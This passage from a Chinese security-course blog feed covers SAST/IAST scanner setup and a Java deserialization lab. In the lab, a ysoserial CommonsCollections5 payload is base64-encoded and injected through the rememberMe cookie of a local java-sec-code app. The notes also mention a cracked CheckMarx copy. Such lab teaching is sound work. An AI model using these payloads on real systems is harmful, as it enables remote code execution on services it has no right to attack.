title="提示成功，等待即可"></a>提示成功，等待即可</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414162146393.png" alt="image-20230414162146393"></p><h6 id="打开洞态，显示自动新增了刚才的项目"><a href="#打开洞态，显示自动新增了刚才的项目" class="headerlink" title="打开洞态，显示自动新增了刚才的项目"></a>打开洞态，显示自动新增了刚才的项目</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414162328959.png" alt="image-20230414162328959"></p><h6 id="检测到了SQL注入等"><a href="#检测到了SQL注入等" class="headerlink" title="检测到了SQL注入等"></a>检测到了SQL注入等</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414162447670.png" alt="image-20230414162447670"></p><h6 id="对于php低版本不友好"><a href="#对于php低版本不友好" class="headerlink" title="对于php低版本不友好"></a>对于php低版本不友好</h6><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/image-20230414162809481.png" alt="image-20230414162809481"></p><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h4 id="代码审计利器-IAST-SemmleQL测评报告"><a href="#代码审计利器-IAST-SemmleQL测评报告" class="headerlink" title="#代码审计利器-IAST-SemmleQL测评报告"></a>#代码审计利器-IAST-SemmleQL测评报告</h4><p><a href="https://lgtm.com/">https://lgtm.com/</a> 代码平台接入测评</p><p>测评：<a href="https://lgtm.com/">https://lgtm.com/</a></p><h4 id="补充说明："><a href="#补充说明：" class="headerlink" title="#补充说明："></a>#补充说明：</h4><p>目前免费可试用的四个IAST平台：</p><p><strong>1、openrasp-iastopenrasp-iast</strong> 是一款灰盒扫描工具，目前开源的IAST扫描器，通过安装Agent和扫描器，能够结合应用内部hook点信息，针对获取到的url请求参数进行fuzz，从而检测到安全漏洞。</p><p>支持的编程语言：<code>Java、PHP。</code></p><p><strong>2、VulHunte</strong>r检测原理是通过在应用程序的字节码中动态插桩检测“探针”，来获取应用程序运行时的各种上下文信息。在应用程序运行时，实时分析程序的安全弱点。与基于SAST和DAST技术的产品相比，VulHunter的最大不同点是，通过字节码插桩应用程序获得更多准确的运行时信息。</p><p>支持的编程语言：<code>java、node.js。</code></p><p><strong>3、火线~洞态IAST洞态IAST提供SAAS平台</strong>，个人用户通过填写问卷注册登录，下载Agent进行应用程序部署，正常访问应用，就可以触发漏洞检测。漏洞结果提供比较详细的HTTP数据包和污点流图，可用于快速验证和复现漏洞。</p><p>支持的编程语言：<code>Java、PHP，Python，Go。</code></p><p><strong>4、Semmle QLSemmle</strong>公司声称以一种独特的方法寻找代码中的漏洞。技术核心是把代码当成数据，将分析问题变成对数据库的请求。SemmleQL是一个声明式的面向对象的查询语言。</p><p>支持的编程语言：<code>Java，JavaScript，Python，TypeScript，C＃，Go，C/C ++</code></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day95 代码审计-SAST&amp;IAST项目&amp;PHP&amp;Java&amp;NET&amp;Python&amp;Js&amp;Go等测评</title>
      <link href="/2023/04/11/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/"/>
      <url>/2023/04/11/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、代码审计-开源版&amp;商业版</p><p>2、代码审计-单语言&amp;多语言</p><p>3、代码审计-DAST&amp;SAST&amp;IAST</p><h3 id="Java审计知识点："><a href="#Java审计知识点：" class="headerlink" title="#Java审计知识点："></a>#Java审计知识点：</h3><p><a href="https://xz.aliyun.com/t/7945">https://xz.aliyun.com/t/7945</a>   java代码审计常规思路和方法.pdf</p><p>SQL注入，XSS跨站，RCE执行，反序列化，身份验证，SPEL，SSTI，三方组件安全等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/Qu9rvdL1uVm46pnMkdIKKw.png" alt="img"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/1KVCYs7pMFhVOkRfle1BnA.png" alt="img"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/1KVCYs7pMFhVOkRfle1BnA.png" alt="img"></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-代码审计利器-SAST-单语言"><a href="#➢-代码审计利器-SAST-单语言" class="headerlink" title="➢ 代码审计利器-SAST-单语言"></a>➢ 代码审计利器-SAST-单语言</h4><h4 id="➢-代码审计利器-SAST-多语言"><a href="#➢-代码审计利器-SAST-多语言" class="headerlink" title="➢ 代码审计利器-SAST-多语言"></a>➢ 代码审计利器-SAST-多语言</h4></blockquote><p>DAST&amp;SAST&amp;IAST</p><p>DAST：动态应用程序安全测试（Dynamic Application Security Testing）技术在测试或运行阶段分析应用程序的动态运行状态。它模拟黑客行为对应用程序进行动态攻击，分析应用程序的反应，从而确定该Web应用是否易受攻击。</p><p>SAST：静态应用程序安全测试（Static Application Security Testing）技术通常在编码阶段分析应用程序的源代码或二进制文件的语法、结构、过程、接口等来发现程序代码存在的安全漏洞。</p><p>IAST：交互式应用程序安全测试（Interactive Application Security Testing）是2012年Gartner公司提出的一种新的应用程序安全测试方案，通过代理、VPN或者在服务端部署Agent程序，收集、监控Web应用程序运行时函数执行、数据传输，并与扫描器端进行实时交互，高效、准确的识别安全缺陷及漏洞，同时可准确确定漏洞所在的代码文件、行数、函数及参数。IAST相当于是DAST和SAST结合的一种互相关联运行时安全检测技术。</p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414151639258.png" alt="image-20230414151639258"></p><p>目前还有些商业版平台未介绍如下：</p><p>静态：CheckMarx 奇安信代码卫士等</p><p>IAST：悬镜灵脉IAST 默安雳鉴IAST等</p><p><strong>PHP</strong> -Seay RIPS <strong>CheckMarx Fortify</strong>（这两款占用cpu较大，不建议本机使用） VCG Kunlun-M</p><p><strong>NET</strong> -VCG Fortify CheckMarx</p><p><strong>Java</strong>-Fortify Fortify CheckMarx</p><p><strong>Python</strong>-Bandit Fortify CheckMarx</p><p><strong>JS</strong>-Kunlun-M NodeJsScan Fortify CheckMarx</p><p><strong>Go</strong>-Gosec CheckMarx</p><h4 id="Bandit"><a href="#Bandit" class="headerlink" title="Bandit"></a>Bandit</h4><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414143726848.png" alt="image-20230414143726848"></p><p>参考：<a href="https://bandit.readthedocs.io/">https://bandit.readthedocs.io/</a></p><p>安装：pip install bandit</p><h5 id="linux"><a href="#linux" class="headerlink" title="linux:"></a>linux:</h5><p>安装后会在当前Python目录下bin</p><p>使用：bandit -r 需要审计的源码目录</p><h5 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h5><p>安装后会在当前Python目录下script</p><p>使用：bandit -r 需要审计的源码目录</p><p>D:\Python3\Scripts&gt;bandit.exe -r F:\python_webapp\www\</p><h4 id="Kunlun-M"><a href="#Kunlun-M" class="headerlink" title="Kunlun-M"></a>Kunlun-M</h4><p>1、安装依赖库：pip install -r requirements.txt</p><p>2、配置文件启用：cp Kunlun_M&#x2F;settings.py.bak Kunlun_M&#x2F;settings.py</p><p>3、初始化数据库：python kunlun.py init initialize</p><p>4、加载规则数据库：python kunlun.py config load</p><p>Web使用：D:\Python38\python.exe kunlun.py web -p 9999</p><p>Cli使用：D:\Python38\python.exe kunlun.py scan -t D:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;xhcms</p><h4 id="Gosec"><a href="#Gosec" class="headerlink" title="Gosec"></a>Gosec</h4><p>curl -sfL <a href="https://raw.githubusercontent.com/securego/gosec/master/install.sh">https://raw.githubusercontent.com/securego/gosec/master/install.sh</a> | sh -s – -b $(go env GOPATH)&#x2F;bin v2.12.0</p><p>gosec -fmt&#x3D;json -out&#x3D;results.json .&#x2F;…</p><p><strong>VCG</strong> </p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414142159413.png" alt="image-20230414142159413"></p><p><strong>CheckMarx</strong> （<strong>会追踪参数调用过程</strong>）</p><h5 id="这里只有这个打包的虚拟机里面有破解的"><a href="#这里只有这个打包的虚拟机里面有破解的" class="headerlink" title="这里只有这个打包的虚拟机里面有破解的"></a>这里只有这个打包的虚拟机里面有破解的</h5><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414141509127.png" alt="image-20230414141509127"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414142516597.png" alt="image-20230414142516597"></p><p><strong>Fortify</strong></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414133629131.png" alt="image-20230414133629131"></p><p><strong>1、</strong><a href="https://github.com/securego/gosec">https://github.com/securego/gosec</a>   Go</p><p><strong>2、</strong><a href="https://github.com/FeeiCN/Cobra">https://github.com/FeeiCN/Cobra</a> 多语言</p><p><strong>3、</strong><a href="https://github.com/LoRexxar/Kunlun-M">https://github.com/LoRexxar/Kunlun-M</a> PHP&amp;Js</p><h5 id="文档生成"><a href="#文档生成" class="headerlink" title="文档生成"></a>文档生成</h5><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414132722567.png" alt="image-20230414132722567"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414120035899.png" alt="image-20230414120035899"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414132747346.png" alt="image-20230414132747346"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414133137102.png" alt="image-20230414133137102"></p><h6 id="使用web界面显示"><a href="#使用web界面显示" class="headerlink" title="使用web界面显示"></a>使用web界面显示</h6><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414132454822.png" alt="image-20230414132454822"></p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414132534965.png" alt="image-20230414132534965"></p><p><strong>4、</strong><a href="https://github.com/presidentbeef/brakeman">https://github.com/presidentbeef/brakeman</a> Ruby</p><p><strong>5、</strong><a href="https://github.com/ajinabraham/NodeJsScan">https://github.com/ajinabraham/NodeJsScan</a> JS框架</p><p><strong>6、</strong><a href="https://github.com/PyCQA/bandit/releases">https://github.com/PyCQA/bandit/releases</a> Python</p><p><img src="/../images/Day95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-PHP-Java-NET-Python-Js-Go%E7%AD%89%E6%B5%8B%E8%AF%84/image-20230414114357179.png" alt="image-20230414114357179"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day94 代码审计-Java项目&amp;SSTI&amp;SSRF&amp;XXE&amp;XML&amp;CNVD模版&amp;CTF组件&amp;shiro反序列化</title>
      <link href="/2023/04/11/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/"/>
      <url>/2023/04/11/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Java-原理-反序列化</p><p>2、Java-利用-利用链&amp;构造</p><p>3、Java-代审-原生态&amp;框架组件</p><h3 id="Java审计知识点："><a href="#Java审计知识点：" class="headerlink" title="#Java审计知识点："></a>#Java审计知识点：</h3><p><a href="https://xz.aliyun.com/t/7945">https://xz.aliyun.com/t/7945</a>  java代码审计常规思路和方法.pdf</p><p>SQL注入，XSS跨站，RCE执行，反序列化，身份验证，SPEL，SSTI，三方组件安全等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="#前置知识:"></a>#前置知识:</h4><h5 id="1、解释"><a href="#1、解释" class="headerlink" title="1、解释"></a>1、解释</h5><p>​    序列化是用于将对象转换成二进制串存储,对应着writeObject，反序列正好相反,将二进制串转换成对象,对应着readobject</p><h5 id="2、Java语言"><a href="#2、Java语言" class="headerlink" title="2、Java语言"></a>2、Java语言</h5><p>​    ObjectInputStream.readObject</p><p>​    ObjectInputStream.readUnshared</p><p>​    XMLDecoder.readObject</p><p>​    Yaml.load</p><p>​    XStream.fromXML</p><p>​    ObjectMapper.readValue</p><p>​    JSON.parseObject</p><h5 id="3、使用场景"><a href="#3、使用场景" class="headerlink" title="3、使用场景"></a>3、使用场景</h5><p>​    http参数，cookie，sesion，存储方式可能是base64(rO0），压缩后的base64,MII等</p><p>​    Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMI,JMS,JND1等</p><p>​    xm lXstream,XmldEcoder等（http Body:Content-type: application&#x2F;xml）</p><p>​    json(jackson,fastjson)http请求中包含</p><h5 id="4、利用类别"><a href="#4、利用类别" class="headerlink" title="4、利用类别"></a>4、利用类别</h5><p>​    引用库包调用反射（如：ysoserial），自身框架组件特性（如：Fastjson）</p><h5 id="5、利用工具"><a href="#5、利用工具" class="headerlink" title="5、利用工具"></a>5、利用工具</h5><p>​    jndi，ysoserial，marshalsec(解决不回显利用rmi、ladp服务等)，FastjsonExploit等</p><p>FastjsonExploit：</p><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413111817346.png" alt="image-20230413111817346"></p><h5 id="5-1、框架组件"><a href="#5-1、框架组件" class="headerlink" title="5.1、框架组件"></a>5.1、框架组件</h5><p>​    fastjson，shiro，jackson，CommonsCollections等</p><h5 id="6、挖掘思路"><a href="#6、挖掘思路" class="headerlink" title="6、挖掘思路"></a>6、挖掘思路</h5><p>​    1、原生态的关键函数搜索（搜不到关键字就采用方法2）</p><p>​    2、框架组件的引用查看获取（pom.xml文件里找框架）</p><h5 id="解决不回显：自己本地启动服务，让别人加载这个链接执行相应的命令"><a href="#解决不回显：自己本地启动服务，让别人加载这个链接执行相应的命令" class="headerlink" title="解决不回显：自己本地启动服务，让别人加载这个链接执行相应的命令"></a>解决不回显：自己本地启动服务，让别人加载这个链接执行相应的命令</h5><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413111426341.png" alt="image-20230413111426341"></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-原生态-反序列化-ObjectInput"><a href="#➢-原生态-反序列化-ObjectInput" class="headerlink" title="➢ 原生态-反序列化-ObjectInput"></a>➢ 原生态-反序列化-ObjectInput</h4><h4 id="➢-利用链-反序列化-Ysoserial-amp-JNDI"><a href="#➢-利用链-反序列化-Ysoserial-amp-JNDI" class="headerlink" title="➢ 利用链-反序列化-Ysoserial&amp;JNDI"></a>➢ 利用链-反序列化-Ysoserial&amp;JNDI</h4><h4 id="➢-框架组件-反序列化-Tmall-amp-Jspxcms"><a href="#➢-框架组件-反序列化-Tmall-amp-Jspxcms" class="headerlink" title="➢ 框架组件-反序列化-Tmall&amp;Jspxcms"></a>➢ 框架组件-反序列化-Tmall&amp;Jspxcms</h4></blockquote><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413113206075.png" alt="image-20230413113206075"></p><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413115738839.png" alt="image-20230413115738839"></p><p>​    </p><h4 id="原生态"><a href="#原生态" class="headerlink" title="#原生态"></a>#原生态</h4><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230415155411037.png" alt="image-20230415155411037"></p><h6 id="找到库文件里面对应的"><a href="#找到库文件里面对应的" class="headerlink" title="找到库文件里面对应的"></a>找到库文件里面对应的</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413113643844.png" alt="image-20230413113643844"></p><h6 id="ysoserial里面"><a href="#ysoserial里面" class="headerlink" title="ysoserial里面"></a>ysoserial里面</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413113718543.png" alt="image-20230413113718543"></p><h6 id="有的复现不成功是因为少了依赖包，像这种三个一个都不能少才能执行payload"><a href="#有的复现不成功是因为少了依赖包，像这种三个一个都不能少才能执行payload" class="headerlink" title="有的复现不成功是因为少了依赖包，像这种三个一个都不能少才能执行payload"></a>有的复现不成功是因为少了依赖包，像这种三个一个都不能少才能执行payload</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413114825300.png" alt="image-20230413114825300"></p><h6 id="java-jar-ysoserial-jar-CommonsCollections5-“calc”-生成了乱码，需要base64编码，但是不能乱码直接复制，乱码复制即使base64编码也会出错，因为存在空格等字符"><a href="#java-jar-ysoserial-jar-CommonsCollections5-“calc”-生成了乱码，需要base64编码，但是不能乱码直接复制，乱码复制即使base64编码也会出错，因为存在空格等字符" class="headerlink" title="java -jar ysoserial.jar CommonsCollections5 “calc” 生成了乱码，需要base64编码，但是不能乱码直接复制，乱码复制即使base64编码也会出错，因为存在空格等字符"></a>java -jar ysoserial.jar CommonsCollections5 “calc” 生成了乱码，需要base64编码，但是不能乱码直接复制，乱码复制即使base64编码也会出错，因为存在空格等字符</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413115502990.png" alt="image-20230413115502990"></p><h6 id="使用命令：java-jar-ysoserial-jar-CommonsCollections5-“calc”-base64-直接自动进行编码"><a href="#使用命令：java-jar-ysoserial-jar-CommonsCollections5-“calc”-base64-直接自动进行编码" class="headerlink" title="使用命令：java -jar ysoserial.jar CommonsCollections5 “calc” | base64 直接自动进行编码"></a>使用命令：java -jar ysoserial.jar CommonsCollections5 “calc” | base64 直接自动进行编码</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413115923026.png" alt="image-20230413115923026"></p><h6 id="复制下来保存到1-txt，因为复制的都没有换行去空，编写脚本换行去空"><a href="#复制下来保存到1-txt，因为复制的都没有换行去空，编写脚本换行去空" class="headerlink" title="复制下来保存到1.txt，因为复制的都没有换行去空，编写脚本换行去空"></a>复制下来保存到1.txt，因为复制的都没有换行去空，编写脚本换行去空</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413115907002.png" alt="image-20230413115907002"></p><h6 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413124902546.png" alt="image-20230413124902546"></p><h6 id="因为是cookie接收的"><a href="#因为是cookie接收的" class="headerlink" title="因为是cookie接收的"></a>因为是cookie接收的</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413124807781.png" alt="image-20230413124807781"></p><h6 id="登录抓包，把rememb-me改为上述生成的payload"><a href="#登录抓包，把rememb-me改为上述生成的payload" class="headerlink" title="登录抓包，把rememb me改为上述生成的payload"></a>登录抓包，把rememb me改为上述生成的payload</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413125056882.png" alt="image-20230413125056882"></p><p><a href="http://localhost:8080/java-sec-code-1.0.0/deserialize/rememberMe/vuln">http://localhost:8080/java-sec-code-1.0.0/deserialize/rememberMe/vuln</a></p><p>rememberMe&#x3D;xxxxxxxxxxxxxxxxxxxxxxxxxx</p><h6 id="弹出计算器"><a href="#弹出计算器" class="headerlink" title="弹出计算器"></a>弹出计算器</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413125115086.png" alt="image-20230413125115086"></p><h4 id="利用链"><a href="#利用链" class="headerlink" title="#利用链"></a>#利用链</h4><h6 id="1、jndi-可用于Fastjson、Jackson等验证"><a href="#1、jndi-可用于Fastjson、Jackson等验证" class="headerlink" title="1、jndi 可用于Fastjson、Jackson等验证"></a>1、jndi 可用于Fastjson、Jackson等验证</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413130315289.png" alt="image-20230413130315289"></p><h6 id="2、ysoserial-支持多种引用库生成的payload"><a href="#2、ysoserial-支持多种引用库生成的payload" class="headerlink" title="2、ysoserial 支持多种引用库生成的payload"></a>2、ysoserial 支持多种引用库生成的payload</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413113516038.png" alt="image-20230413113516038"></p><h6 id="3、marshalsec-可以快速启动rmi-x2F-ldap-server"><a href="#3、marshalsec-可以快速启动rmi-x2F-ldap-server" class="headerlink" title="3、marshalsec 可以快速启动rmi&#x2F;ldap server"></a>3、marshalsec 可以快速启动rmi&#x2F;ldap server</h6><h6 id="4、FastjsonExploit-专门针对fastjson的exp框架"><a href="#4、FastjsonExploit-专门针对fastjson的exp框架" class="headerlink" title="4、FastjsonExploit 专门针对fastjson的exp框架"></a>4、FastjsonExploit 专门针对fastjson的exp框架</h6><h4 id="框架组件"><a href="#框架组件" class="headerlink" title="#框架组件"></a>#框架组件</h4><h5 id="1、Tmall天猫漏洞-fastjson"><a href="#1、Tmall天猫漏洞-fastjson" class="headerlink" title="1、Tmall天猫漏洞  fastjson"></a>1、Tmall天猫漏洞  fastjson</h5><h5 